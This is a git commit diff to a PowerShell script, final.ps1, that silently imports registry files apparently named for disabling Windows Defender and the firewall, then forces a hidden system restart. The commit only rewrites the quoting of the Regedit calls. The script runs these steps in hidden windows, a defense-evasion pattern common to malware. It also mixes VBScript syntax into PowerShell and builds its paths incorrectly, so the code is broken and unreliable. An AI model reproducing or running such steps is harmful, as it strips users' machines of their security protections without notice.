6864059b9a510c632a5a396f41d1da74a92e4755
khlriguasd <45276188+khlriguasd@users.noreply.github.com>
2018-11-24 00:20:03 +0100

    Update final.ps1

--- final.ps1
+++ final.ps1
@@ -10,11 +10,11 @@ $Shh = New-Object -ComObject WScript.Shell
 WScript.Echo($Shh.ExpandEnvironmentStrings("%ProgramFiles%"))
 $ProgramFiles = $Shh.ExpandEnvironmentStrings("%ProgramFiles%")
 $sRegFile = "$($ProgramFiles) C:\Users\q\Desktop\WDdisable.reg"
-$Shh.Run("Regedit.exe /s " & Chr(34) & sRegFile & Chr(34), 0, True)
+$Shh.Run("Regedit.exe /s '$($sRegFile)'", 0, True)
 
 
 $sRegFile ="$($ProgramFiles) C:\Users\q\Desktop\FireDisa.reg"
-$Shh.Run("Regedit.exe /s " & Chr(34) & sRegFile & Chr(34), 0, True)
+$Shh.Run("Regedit.exe /s '$($sRegFile)'", 0, True)
 
 $Shh = New-Object -ComObject Shell.Application
 $Shh.ShellExecute("cmd.exe","/c powershell Restart-Computer","","",0)
